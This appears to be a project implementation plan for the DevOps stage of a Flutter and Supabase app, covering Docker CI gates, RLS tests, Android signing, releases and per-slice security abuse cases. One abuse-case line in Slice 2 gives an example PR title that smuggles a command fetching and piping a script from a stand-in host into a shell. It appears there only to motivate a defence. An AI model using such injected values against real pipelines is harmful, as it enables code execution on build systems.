# Implementation Plan: Stage 0, `devops`

> Source: [SPEC-devops.md](../specs/SPEC-devops.md), [SPEC.md › Stages](../specs/SPEC.md#stages) · Status: **approved 2026-11-19**
> Tasks: [todo.md](todo.md)

## Overview

Stage 0 makes the repo reproducible and gated before any feature code exists. The app stays the `flutter create` template. By the end:
- one Docker image runs the quality gate on the laptop and in CI
- the `flutter` and `rules` checks are required on `dev` and `main`
- a local Supabase project has a guard test that fails if any table is missing RLS
- merging deploys migrations: to staging on `dev`, and to production on `main` after your approval
- a `v*` tag builds a draft release with a signed APK and the web bundle

Five slices, each on its own `feat/devops-*` branch, squash-merged into `dev`. The stage ends with a merge commit `dev` → `main` and the tag `v0.0.0`.

## Starting point (verified 2026-11-19)

- **Git:**
  - `dev` and `origin/dev` are at `eafae22` (flutter create), and `docs/project-definition` branches from there
  - `origin/main` is at `5b9fce7` (PR #1 merged `dev`); your local `main` is behind it
  - `.claude/` (dev_rules, specs, this plan) is untracked
- **GitHub:** public repo; no rulesets, environments or workflows yet.
- **`.gitignore` is GitHub's template for the Flutter *framework* repo.**
  - Its `*.lock` line ignores `pubspec.lock`, so the lockfile exists locally but **isn't committed**. SPEC.md says it is; Task 1 fixes both.
  - It already ignores `**/android/key.properties`, `*.jks` and `coverage/`.
- **pubspec:** `version: 1.0.0+1`, no Flutter pin.
- **Android:**
  - the release build is signed with the debug key (template default)
  - the debug manifest only adds `INTERNET`
- **Local tools:**
  - Flutter 3.47.6 (commit `5fc346839b5d0eef006ed8404392afb4dfae428d`), JDK 21.0.13, Docker 29.9.3
  - Android SDK in `~/Android/Sdk`: platform 36, build-tools 36.0.0, NDK 28.2.13676358, `adb`
  - no Supabase CLI, no `psql`
- **Flutter 3.47.6 Android defaults:** compileSdk and targetSdk 36, minSdk 24, NDK `28.2.13676358`.
- **The exact pin works both ways:** with Flutter 3.47.6, `environment: flutter: 3.40.0` and `3.48.0` both fail `flutter pub get` (tested in a scratch project). AC-OPS-1 holds as written.
- **Supabase CLI:**
  - the latest stable is **v3.2.0** (2026-11-16)
  - v3 targets the local stack by default; `--remote=REF` replaces `--linked` and `--project-ref`
  - commands that change a hosted project need `--yes` in CI
  - the config section `[inbucket]` is now `[local_smtp]`
  - `db lint` still exists, and `db advisors` now lints locally
- **Pins to use:**

  | Item | Version | Pin |
  |---|---|---|
  | `ubuntu` | 24.04 | `sha256:73b999393d07f2bf65a40373778a44dc9a6d54ad7718d29247d8ff9413c4d6a8` |
  | `nginxinc/nginx-unprivileged` | stable-alpine | `sha256:f5116ed4606f3eb015dd4a8e28cb9b351476dc0ad4bc6e9f93b19cec130cdf03` |
  | `actions/checkout` | v7.0.1 | `3d3c42e5aac5ba805825da76410c181273ba90b1` |
  | `docker/setup-buildx-action` | v4.4.1 | `f87e5991a6d7451dcb8d9637bfbc97413f497069` |
  | `docker/build-push-action` | v7.4.0 | `c3c9e263c25d99ce0380d002d59b67737d91b0dc` |
  | `actions/upload-artifact` | v7.0.2 | `cf430e030ddbb5b0abf93d22962f4752f3646cd9` |
  | `supabase/setup-cli` | v3.2.0 | `689adcfb80d947100a1eab127289b97d1fb07b13` |
  | Supabase CLI | 3.2.0 | through `setup-cli`'s `version:` input |
  | Android command-line tools | latest at Task 2 | zip SHA-256 from developer.android.com |

## Architecture decisions

**Dependency and environment decisions (dev_rules §7):**
- **Five GitHub Actions and Supabase CLI 3.2.0,** listed above (**approved 2026-11-19**). All come from their official publishers (GitHub, Docker, Supabase). They're the minimum set:
  - `setup-buildx` + `build-push` give CI the layer cache, without which every run rebuilds the 4–5 GB toolchain
  - `upload-artifact` publishes coverage, as the spec says
  - releases use the `gh` CLI that runners already have, so no release Action is needed
  
  Task 1 adds them to SPEC.md's Tech Stack.
- **The release job runs in the `production` environment** (**approved 2026-11-19**, option A), and the Android signing secrets live there. Every tag then waits for your approval before the keystore is ever decoded, and a workflow on another branch can't read it. Updates SPEC-devops.

**Spec corrections, made in Task 1** (spec first, as dev_rules §3 says):
1. **SPEC.md, Starting point:** the lockfile isn't committed yet; Task 1 commits it.
2. **`GOOGLE_WEB_CLIENT_ID` moves to `auth`.**
   - In Stage 1, `app-foundation` refuses to start with an empty config key, but the Google client only exists from Stage 2.
   - So Stages 0–1 have two keys (`SUPABASE_URL`, `SUPABASE_PUBLISHABLE_KEY`), and `auth` adds the third to all three config files. This follows the devops spec's own rule: "New keys are added to all three config files in the same slice".
   - Edits SPEC-devops, SPEC-app-foundation and SPEC-auth.
3. **CLI v3 forms in SPEC-devops:**
   - CD runs `supabase db push --remote=PROJECT_REF --yes`, with no `link` step
   - `config.toml` uses `[local_smtp]`
4. **AC-OPS-5's secret-scan canary** becomes one of the scan's plain-word patterns (see dev_rules §9, first scan) instead of a fake `sb_secret_` key. GitHub push protection might block a key-shaped string, and the canary would then never reach CI.
5. **The `rules` job also runs `supabase db advisors`,** if Task 7 finds a flag that makes it fail on findings. It flags security problems such as RLS missing or a `security definer` view, which `db lint` (PL/pgSQL errors) doesn't.
6. **The RLS guard test also fails on a `public` view without `security_invoker = true`.** This enforces dev_rules §9 ("Views use `security_invoker = true`") at no extra cost.

**Build decisions:**
- **Slices run in risk order:**
  1. The Docker toolchain, the biggest unknown: size, time, and the Android SDK inside a container.
  2. CI on GitHub (cache, timing).
  3. Supabase on the runner.
  4. Android signing.
  5. The hosted environments, which need your setup work first.
- **The toolchain checks what it downloads:**
  - the base image by digest
  - Flutter cloned at tag `3.47.6`, then `git rev-parse HEAD` compared with the pinned commit, so a moved tag fails the build
  - the Android command-line tools zip checked against its SHA-256
  - `sdkmanager` installs exactly platform 36, build-tools 36.0.0 and NDK 28.2.13676358
  - apt packages (OpenJDK 21) come from Ubuntu's signed archive without version pins; the base digest fixes the release
- **Non-root user:** `ubuntu:24.04` already has a `ubuntu` user with UID 1000. The Dockerfile removes it, then creates `dev` with the `UID`/`GID` build args (default 1000). CI passes the runner's IDs, so files written to bind mounts stay readable.
- **Layer order** for caching: toolchain → `pubspec.*` + `flutter pub get --enforce-lockfile` → the rest of the repo. Locally, Gradle downloads go in a BuildKit cache mount. CI caches layers only; if the `flutter` job takes over 15 minutes, a follow-up task warms Gradle in a layer keyed on `android/`.
- **A `ci-report` stage** (`FROM scratch`, copying `coverage/lcov.info` from `ci`) lets one `build-push` call run the gate and export coverage for `upload-artifact`.
- **The web build uses `--no-web-resources-cdn`,** so CanvasKit is served from the image and the CSP can stay `'self'`. Task 5 checks the Chromium console for CSP violations; if Flutter still fetches fonts from Google, that host is allowed and recorded.
- **The PR title is passed to the check through `env:`,** never `${{ }}` inside `run:`, so a malicious title can't inject shell commands.
- **Dependabot PRs target `dev`,** like feature branches.
- **Environment deployment rules:** `staging` accepts `dev` only; `production` accepts `main` and tags `v*`.
- **The integration-test step of `rules` waits** for the first module that adds `test/integration/` (Stage 2). Adding a step now would mean code nothing exercises.
- **Version:** `0.0.0+1` from Task 1. The release workflow passes `--build-number` from the run number, so `versionCode` always increases.

## Task list

The details are in [todo.md](todo.md).

**Before Slice 1 (you):** create the rulesets `Dev PR` (PR required, squash only) and `Main PR` (PR required, merge commits allowed), both blocking force-push and deletion. Then commit `.claude/` on `docs/project-definition` and squash-merge it into `dev` through a PR.

### Slice 1: `feat/devops-gate`, the Docker quality gate
- [x] Task 1: Spec corrections, Flutter pin, version, lockfile, `.gitignore`
- [x] Task 2: Dockerfile `toolchain` stage and `.dockerignore`
- [x] Task 3: `ci` stage, coverage script, `integration` tag

**Checkpoint 1:**
- [x] `docker build --target ci .` is green on a fresh clone
- [x] REVIEW written → you commit, open a PR, squash-merge (PR #3, merged 2026-11-20)

**Security:**
- **Trust boundaries:** everything the toolchain downloads (Docker Hub, the Flutter repo, Google's SDK zips, the Ubuntu archive); the Docker build context.
- **Worth attacking:** the toolchain, which builds every APK.
- **Abuse cases:**
  - a moved tag or a swapped image brings in other code → digest, commit and SHA-256 checks
  - `config/local.json` or `key.properties` ends up in a layer → `.dockerignore`, verified with `find` in the image
  - the build runs as root → the `dev` user

### Slice 2: `feat/devops-ci`, the `flutter` check
- [x] Task 4: `tool/secret_scan.sh` and `tool/check_pins.sh`
- [x] Task 5: `build-web` and `web` stages, `nginx.conf`, config placeholders, smoke script
- [ ] Task 6: `ci.yml` job `flutter`, plus `dependabot.yml`

**Checkpoint 2:**
- [ ] The slice PR shows `flutter` green
- [ ] Throwaway PRs fail as expected (AC-OPS-3, AC-OPS-5) and are closed unmerged
- [ ] You make `flutter` a required check in both rulesets (decided 2026-11-19: each check is required as soon as it's green)

**Security:**
- **Trust boundaries:** public PRs from forks, Dependabot PRs, third-party Actions, the browser loading the web image.
- **Worth attacking:** the CI token, and the web page's script origin.
- **Abuse cases:**
  - a fork PR prints secrets → `pull_request` only, `contents: read`, no secrets
  - a PR title like `` feat: x`curl evil|sh` `` → passed through `env:`
  - a re-tagged Action → SHA pins enforced by `check_pins.sh`
  - injected script or framing on the web page → CSP `'self'`, `frame-ancestors 'none'`, `nosniff`
  - nginx as root → the unprivileged image

### Slice 3: `feat/devops-supabase`, local Supabase and the `rules` check
- [ ] Task 7: `supabase init`, `config.toml`, empty seed, RLS and view guard test
- [ ] Task 8: `ci.yml` job `rules`

**Checkpoint 3:**
- [ ] `supabase test db` is green locally and in `rules`
- [ ] The guard test fails on a throwaway table without RLS
- [ ] REVIEW → PR → squash-merge
- [ ] You make `rules` a required check in both rulesets

**Security:**
- **Trust boundaries:** the Supabase CLI and the Docker images it pulls (pinned by the CLI version); `config.toml` is public.
- **Abuse cases:**
  - a future migration forgets RLS or `security_invoker` → the guard test fails
  - a secret is written into `config.toml` → only `env()` references, plus the secret scan
  - real data in the seed → the seed is empty; made-up users come in Stage 2

### Slice 4: `feat/devops-android`, signing and debug-only cleartext
- [ ] Task 9: debug network security config and release signing from `key.properties` or env vars

**Checkpoint 4:**
- [ ] The merged release manifest has no cleartext permission
- [ ] A local release APK is signed with the upload certificate
- [ ] REVIEW → PR → squash-merge

**Security:**
- **Trust boundaries:** the upload keystore (the most sensitive file in the project); the phone's network.
- **Abuse cases:**
  - the keystore or `key.properties` is committed → `.gitignore` plus scan 2
  - cleartext slips into release → the config lives only in `src/debug`, checked in the merged release manifest
  - a release signed with the debug key gets installed on family phones → no debug-key fallback

### Slice 5: `feat/devops-delivery`, environments, CD and releases
- [ ] Task 10: real `config/staging.json` and `prod.json`, plus `deploy-db.yml`
- [ ] Task 11: `release.yml`

**Checkpoint 5:**
- [ ] Merging the slice deploys to staging (AC-OPS-10, staging half)
- [ ] A throwaway `v0.0.0-rc.1` tag produces a draft release (deleted afterwards)

**Security:**
- **Trust boundaries:** GitHub environment secrets, the hosted Supabase projects, the release job.
- **Worth attacking:** the database password, the access token, the keystore.
- **Abuse cases:**
  - a workflow on another branch reads production secrets → deployment branch rules plus the required reviewer
  - the keystore appears in logs → decoded to a file in `$RUNNER_TEMP`, never echoed, removed in an `always()` step
  - the token is too powerful → a scoped Supabase token, limited to the two projects

### Stage close
- [ ] Task 12: rulesets require both checks, `dev` → `main`, production deploy, tag `v0.0.0`, dependency and security review

**Checkpoint 6, Stage 0 done:**
- [ ] Every AC-OPS passes, with its evidence in REVIEW
- [ ] Draft release `v0.0.0` published by you
- [ ] The APK is installed on your phone

## Risks and mitigations

| Risk | Impact | Mitigation |
|---|---|---|
| The toolchain image is 4–5 GB and takes 15–25 min to build the first time | Med | layer order; GHA layer cache; measure in Task 2; NDK kept because release builds use it to strip symbols |
| Gradle downloads on every CI run make the `flutter` job slow | Med | cache mount locally; measure in Task 6; warm-up layer if the job takes over 15 min |
| The GHA cache (10 GB per repo) evicts toolchain layers | Low | `mode=max`; watch cache hits in Task 6 |
| The CSP breaks Flutter web (CanvasKit, fonts, inline styles) | Med | `--no-web-resources-cdn`; Chromium console check in Task 5; loosen only what's needed and record why |
| Supabase CLI v3 flags differ from the docs | Med | every command checked with `--help` before use; the spec is updated in Task 1 |
| `supabase start` on the runner is slow or flaky | Low | exclude unused services (checked with `--help`); a job timeout |
| The free staging project pauses during quiet weeks | Low | KI-1; CD fails loudly, and you restore it from the dashboard |
| The upload keystore is lost | High | back it up in your password manager before Task 9; Task 12 checks you did |
| Different UIDs on bind mounts in the release job | Low | the toolchain is built with the runner's UID and GID |

## Open questions

1. ~~Approve the five Actions and Supabase CLI 3.2.0?~~ **Approved 2026-11-19.**
2. ~~Where do the Android signing secrets live?~~ **In `production`, with you as required reviewer (option A, 2026-11-19).** Every release run waits for your approval before the keystore is decoded.
3. ~~Required checks now or at the stage close?~~ **Each check is required as soon as it's green (2026-11-19):** `flutter` at Checkpoint 2, `rules` at Checkpoint 3.
